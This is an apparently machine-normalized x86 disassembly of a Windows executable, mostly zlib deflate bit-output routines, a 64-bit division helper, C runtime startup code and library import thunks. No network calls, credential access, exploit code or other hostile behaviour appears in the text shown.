mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x2c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x28 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x10 ]
xor eax eax
mov ax [ edx + ecx * 4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl eax cl
mov edx [ ebp + 0x8 ]
mov cx [ edx + 0x16b0 ]
or cx ax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x10 ]
xor ecx ecx
mov cx [ eax + edx * 4 ]
mov [ ebp - 0x34 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x34 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x34 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x30 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp - 0x48 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x10 ]
xor edx edx
mov dx [ ecx + eax * 4 + 0x2 ]
mov [ ebp - 0x30 ] edx
mov eax 0x10
sub eax [ ebp - 0x30 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
sub eax [ edx * 4 + r--data ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x38 ] ecx
mov edx 0x10
sub edx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax * 4 + r--data ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x38 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x3c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x3c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x3c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x38 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
sub_40886a
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0xc ] 0x80
jge r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + eax * 4 + 0x8c ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x100
jge r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x8c ]
mov edx [ ebp - 0x8 ]
add edx ecx
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x7
jge r-xdata
mov eax [ ebp - 0x8 ]
shr eax 0x2
cmp eax [ ebp - 0x4 ]
sbb ecx ecx
inc ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] cl
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x8c ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_40891c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
and eax 0x1
mov ecx [ ebp - 0x4 ]
or ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
shr edx 0x1
mov [ ebp + 0x8 ] edx
mov eax [ ebp - 0x4 ]
shl eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
sub ecx 0x1
mov [ ebp + 0xc ] ecx
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov eax [ ebp - 0x4 ]
shr eax 0x1
mov esp ebp
pop ebp
retn
sub_40895d
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] 0x8
jl r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] 0x0
jmp r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
mov eax [ ebp + 0x8 ]
mov al [ eax + 0x16b0 ]
mov [ edx + ecx ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
shr dx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x16b4 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
sub_408a46
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] 0x8
jle r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] 0x0
jle r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] 0x0
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov cl [ ecx + 0x16b0 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
sub_408b02
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_408a46
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16ac ] 0x8
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x10 ]
sub edx 0x1
mov [ ebp + 0x10 ] edx
test ecx ecx
je r-xdata
mov edx [ ebp + 0x10 ]
and edx 0xffff
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x10 ]
and ecx 0xffff
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x10 ]
not eax
and eax 0xffff
and eax 0xff
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x14 ]
mov [ edx + ecx ] al
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
mov edx [ ebp + 0x10 ]
not edx
and edx 0xffff
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
mov edx [ ebp + 0xc ]
mov dl [ edx ]
mov [ ecx + eax ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
jmp r-xdata
sub_408c50
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_408e4f
cmp [ rw-data ] ebx
jne r-xdata
call sub_408e3a
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_408e4c
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401000
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401037
mov eax r-xdata
retn
sub_40103d
xor ecx ecx
cmp [ esp + 0x8 ] ecx
jle r-xdata
retn
mov eax [ esp + 0x4 ]
add eax ecx
sub [ eax ] cl
inc ecx
cmp ecx [ esp + 0x8 ]
jl r-xdata
sub_401416
mov eax r-xdata
retn
sub_405540
push ebp
mov ebp esp
mov eax rw-data
pop ebp
retn
sub_40554a
push ebp
mov ebp esp
mov eax 0x2
sub eax [ ebp + 0x8 ]
mov eax [ eax * 4 + rw-data ]
pop ebp
retn
sub_405587
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
call free
add esp 0x4
pop ebp
retn
sub_4058b6
push ebp
mov ebp esp
pop ebp
retn
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_EH_prolog
jmp [ _EH_prolog@IAT ]
strcat
jmp [ strcat@IAT ]
strcpy
jmp [ strcpy@IAT ]
strlen
jmp [ strlen@IAT ]
free
jmp [ free@IAT ]
_ftol
jmp [ _ftol@IAT ]
strcmp
jmp [ strcmp@IAT ]
memset
jmp [ memset@IAT ]
memcpy
jmp [ memcpy@IAT ]
calloc
jmp [ calloc@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_408e3a
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_408e4c
xor eax eax
retn
sub_408e4f
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
sub_408e5c
mov eax r--data
jmp __CxxFrameHandler
sub_408e68
mov eax r--data
jmp __CxxFrameHandler
